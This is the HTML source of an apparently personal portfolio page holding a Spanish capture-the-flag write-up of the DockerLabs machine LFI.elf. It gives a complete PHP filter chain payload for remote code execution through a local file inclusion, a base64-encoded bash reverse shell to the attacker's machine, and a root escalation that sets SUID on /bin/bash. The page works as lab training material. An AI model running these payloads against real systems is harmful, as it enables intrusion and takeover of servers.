@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>LFI.elf - DockerLabs :: Bienvenido a mi Portfolio</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Resolución paso a paso de la máquina LFI.elf de DockerLabs. Explotación de Local File Inclusion." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/writeups/lfielf_dockerlabs/" />
+
+
+  
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="LFI.elf - DockerLabs">
+<meta property="og:description" content="Resolución paso a paso de la máquina LFI.elf de DockerLabs. Explotación de Local File Inclusion." />
+<meta property="og:url" content="http://localhost:1313/writeups/lfielf_dockerlabs/" />
+<meta property="og:site_name" content="Bienvenido a mi Portfolio" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-03-05 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:1313/">
+  <div class="logo">
+    Ghxstsec
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+        
+          <li><a href="/certificaciones">Certificaciones</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog</a></li>
+        
+      
+        
+          <li><a href="/proyectos">Proyectos</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/writeups" >Writeups</a></li>
+        
+      
+        
+          <li><a href="/certificaciones" >Certificaciones</a></li>
+        
+      
+        
+          <li><a href="/posts" >Blog</a></li>
+        
+      
+        
+          <li><a href="/proyectos" >Proyectos</a></li>
+        
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/writeups/lfielf_dockerlabs/">LFI.elf - DockerLabs</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-03-05</time><span class="post-author">Joel Morillas Pagan (Ghxstsec)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/dockerlabs/">DockerLabs</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/lfi/">LFI</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/ctf/">CTF</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="write-up-máquina-lfielf-de-dockerlabs">Write-up Máquina LFI.elf de DockerLabs<a href="#write-up-máquina-lfielf-de-dockerlabs" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9OmGubnfOloCL3s9ymnLEw.png" alt="captionless image"></p>
+<p>Por aquí tenéis mi write-up para la máquina lfi.elf de la plataforma dockerlabs.es</p>
+<p>¡Una vez estando la máquina deployeada, comenzamos!</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1152/format:webp/1*uMvGLrPB2OTDGkqN-pZbrw.png" alt="captionless image"></p>
+<h2 id="enumeracion-inicial"><strong>ENUMERACION INICIAL</strong><a href="#enumeracion-inicial" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Como siempre, comenzamos con el escaneo con nmap, yo uso este comando</p>
+<pre tabindex="0"><code>nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 172.17.0.2
+</code></pre><p>Nos tira esto:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ta4vJZQQ238MrQt2HO7zBw.png" alt="captionless image"></p>
+<p>Así que asumimos que va a ser hacking web, vamos a ver la web</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VsBPapTjGZmllaeB3PvlMw.png" alt="captionless image"><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ShZ8AlE2JbqP7GIOIqDJOg.png" alt="captionless image"><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZIbnWFFMvcm9eiDR-3CbgA.png" alt="captionless image"></p>
+<p>Así que doy por hecho que va a haber algún tipo de archivo escondido, posiblemente en el root directory de la web, así que enumeramos con gobuster</p>
+<pre tabindex="0"><code>gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists-master/Discovery/Web-Content/common.txt -x php,html,txt,svg
+</code></pre><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1sNxelRoiJd4k7WF9w5xEQ.png" alt="captionless image"></p>
+<p>Recuerdo que, si no veis este archivo es porque os habréis olvidado de indicarle las extensiones de los archivos a gobuster, cuidado con eso</p>
+<p>el contenido de secret.txt es este:</p>
+<pre tabindex="0"><code>agent lin,
+I have encrypted this message so that you can see it alone, 
+I need you to help me with a super secret mission, 
+but I can&#39;t tell you the credentials yet, 
+you will have to see them yourself, 
+prepare something inside the page so that you can see them easily you just have to search more.
+Good luck agent lin.
+</code></pre><p>Esto está muy visto la verdad, asumo que será en algún parámetro de PHP, vamos a empezar por el principio, vamos a enumerar el primer directorio (index.php) en busca de parámetros con gobuster</p>
+<pre tabindex="0"><code>gobuster fuzz -u http://172.17.0.2/index.php?FUZZ=../../../../../../etc/passwd -w /usr/share/SecLists-master/Discovery/Web-Content/common.txt --exclude-length 978
+</code></pre><p>y nos da este resultado:</p>
+<pre tabindex="0"><code>===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:              http://172.17.0.2/index.php?FUZZ=../../../../../../etc/passwd
+[+] Method:           GET
+[+] Threads:          10
+[+] Wordlist:         /usr/share/SecLists-master/Discovery/Web-Content/common.txt
+[+] Exclude Length:   978
+[+] User Agent:       gobuster/3.6
+[+] Timeout:          10s
+===============================================================
+Starting gobuster in fuzzing mode
+===============================================================
+Found: [Status=400] [Length=302] [Word=Documents and Settings] http://172.17.0.2/index.php?Documents and Settings=../../../../../../etc/passwd
+Found: [Status=400] [Length=302] [Word=Program Files] http://172.17.0.2/index.php?Program Files=../../../../../../etc/passwd
+Found: [Status=400] [Length=302] [Word=reports list] http://172.17.0.2/index.php?reports list=../../../../../../etc/passwd
+** Found: [Status=200] [Length=1257] [Word=search] http://172.17.0.2/index.php?search=../../../../../../etc/passwd **
+Progress: 4751 / 4751 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre><p>Ahí podemos ver un parámetro en estado 200, así que vamos a revisar el /etc/passwd</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MJq27mUsufyAb35iqQTa7g.png" alt="captionless image"></p>
+<h2 id="intrusión-inicial"><strong>INTRUSIÓN INICIAL</strong><a href="#intrusión-inicial" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>tenemos LFI, recordé que no había ningún tipo de inicio de sesión tipo SSH en la máquina víctima, así que tendremos que sacar una reverse Shell, desde aquí, sabemos que usa PHP, así que optaremos por los <strong>PHP Filter Chain</strong>, generando un parámetro cmd.</p>
+<h2 id="github---synacktivphp_filter_chain_generator">[GitHub - synacktiv/php_filter_chain_generator<a href="#github---synacktivphp_filter_chain_generator" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="contribute-to-synacktivphp_filter_chain_generator-development-by-creating-an-account-on-github">Contribute to synacktiv/php_filter_chain_generator development by creating an account on GitHub.<a href="#contribute-to-synacktivphp_filter_chain_generator-development-by-creating-an-account-on-github" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>github.com](<a href="https://github.com/synacktiv/php_filter_chain_generator?source=post_page-----f68e4c44e21f---------------------------------------">https://github.com/synacktiv/php_filter_chain_generator?source=post_page-----f68e4c44e21f---------------------------------------</a>)</p>
+<p>Una vez descargado el script, usaré este comando</p>
+<pre tabindex="0"><code>python3 php_filter_chain_generator.py --chain &#39;&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;&#39;
+</code></pre><p>nos devolverá algo así:</p>
+<pre tabindex="0"><code>php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+</code></pre><p>Así que creamos la URL de ataque:</p>
+<pre tabindex="0"><code>http://172.17.0.2/index.php?search=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;cmd=id
+</code></pre><p>el cambio que hemos aplicado en el payload es añadir un Ampersand (&amp;) al final, para llamar al parámetro “cmd” y ejecutar comandos en la máquina víctima, y podremos ver esto:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*qEyHWZQJ5FfU-S1UYq5IoA.png" alt="captionless image"></p>
+<p>Así que añadiremos un comando que nos dé una reverse Shell en nuestra máquina local, yo hago el típico comando de una cadena de base64 con el reverse Shell en bash, lo decodeo en el mismo comando, y lo ejecuto en el mismo comando, algo así:</p>
+<pre tabindex="0"><code>Codigo original: /bin/bash -i &gt;&amp; /dev/tcp/172.17.0.1/9001 0&gt;&amp;1
+Encodeado: L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvOTAwMSAwPiYx
+</code></pre><p>Entonces, en la URL quedaría algo así:</p>
+<pre tabindex="0"><code>............|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;cmd=echo &#39;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvOTAwMSAwPiYx&#39;|base64 -d|bash
+</code></pre><p>nos abriremos un listener con nuestro Shell handler preferido en nuestra máquina:</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rI_meZvgzppg54pGw7mZ9w.png" alt="captionless image"></p>
+<p>¿Os acordáis del mensaje de secret.txt? Pues vamos a enumerar muy bien los directorios web de la máquina víctima:</p>
+<h3 id="www-data--lin"><strong>WWW-DATA → LIN</strong><a href="#www-data--lin" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dDTIF_SfCfiWKs2OLc0RPA.png" alt="captionless image"></p>
+<p>Y ahí estaría las credenciales para el usuario Lin</p>
+<p>iniciamos sesión:</p>
+<pre tabindex="0"><code>su lin
+Password: agentelinsecreto
+bash-5.2$ whoami
+lin
+</code></pre><h3 id="lin--root"><strong>LIN → ROOT</strong><a href="#lin--root" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>okay, vamos a enumerar el directorio <strong>/home/lin</strong></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*94KFMl_YCmA-E6L1NofiAg.png" alt="captionless image">```</p>
+<pre tabindex="0"><code>cat user.txt
+ed87c5c288f4909dde74cd499acbce92
+</code></pre><p>Bueno, podemos ver que el script sistem.py se ejecuta como root, y no podemos editarlo, así que tenemos que tirar de analizar el script, podemos ver que usa una librería extraña, llamada subtthreads, vamos a analizar en un caso de <strong>Library Path Hijacking</strong></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g8UD4fYj9qyqpAmpHnkAMQ.png" alt="captionless image"></p>
+<p>Bueno, no es <strong>Library Path Hijacking</strong>, pero podemos ver que cada vez que se ejecuta esta librería, por ejemplo en el script <strong>sistem.py,</strong> se intenta ejecutar el script ubicado en <strong>/tmp/script.sh</strong>, actualmente no existe ningún script en esa ubicación, así que lo creamos nosotros, como se ejecuta como sudo, <strong>vamos a cambiar los permisos del binario /bin/bash</strong></p>
+<p><img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*HIqjtC-SrY89rOUt-vIiIQ.png" alt="captionless image"></p>
+<pre tabindex="0"><code>el contenido de script.sh es:
+#!/bin/bash
+chmod u+s /bin/bash
+</code></pre><p>Así que procedemos con la posible escalada, ejecutando el script “<strong>sistem.py</strong>”, <em>recordar darle permisos de ejecución a /tmp/script.sh</em></p>
+<pre tabindex="0"><code>bash-5.2$ cd /home/lin
+bash-5.2$ ls
+sistem.py  user.txt
+bash-5.2$ python3 sistem.py
+[MENU] Elija una opción:
+  1. Mostrar información del sistema
+  2. Realizar tarea
+  3. Ejecutar módulo subthreads
+  4. Salir
+  Opción: 3
+[MENU] Elija una opción:
+  1. Mostrar información del sistema
+  2. Realizar tarea
+  3. Ejecutar módulo subthreads
+  4. Salir
+  Opción: 4
+Saliendo...
+bash-5.2$ 
+</code></pre><p>Una vez hecho esto, iniciaremos una bash con este comando</p>
+<pre tabindex="0"><code>/bin/bash -p
+```![captionless image](https://miro.medium.com/v2/resize:fit:1244/format:webp/1*V09f2d84SPb-mIm0GdOYIA.png)```
+bash-5.2# cd /root
+bash-5.2# ls
+root.txt
+bash-5.2# cat root.txt
+2d264e1f92a8230d442750d69fba4cc5
+bash-5.2# 
+
+
+Pues hasta ahí llegaría esta máquina, espero que os haya gustado, sé que hay más maneras de pwnear esta máquina, pero yo me decante por esta manera :)
+
+Por si queréis conocerme un poco mas:
+
+👋 Sobre el autor
+
